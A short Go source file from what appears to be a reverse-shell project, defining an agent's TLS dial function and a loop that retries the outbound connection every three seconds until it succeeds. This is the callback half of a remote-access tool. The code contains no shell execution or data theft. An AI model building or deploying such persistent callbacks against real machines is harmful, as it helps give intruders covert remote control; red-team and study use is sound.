package agent

import (
	"crypto/tls"
	"fmt"
	"net"
	"reverse_shell/pkg/crypto_tls"
	"time"
)

func DialTLSServer(addr string, caFile, serverName string) (net.Conn, error) {
	config, err := crypto_tls.TLSClient(caFile, serverName)
	if err != nil {
		return nil, err
	}

	dialer := &net.Dialer{Timeout: time.Second * 5}
	conn, err := tls.DialWithDialer(dialer, "tcp", addr, config)
	if err != nil {
		return nil, err
	}
	return conn, nil
}

func ConnectLoop(addr string, caFile, serverName string) (net.Conn, error) {
	for {
		conn, err := DialTLSServer(addr, caFile, serverName)
		if err == nil {
			return conn, nil
		}
		fmt.Printf("Failed to connect to %s: %v\n", addr, err)
		time.Sleep(time.Second * 3)
	}
}
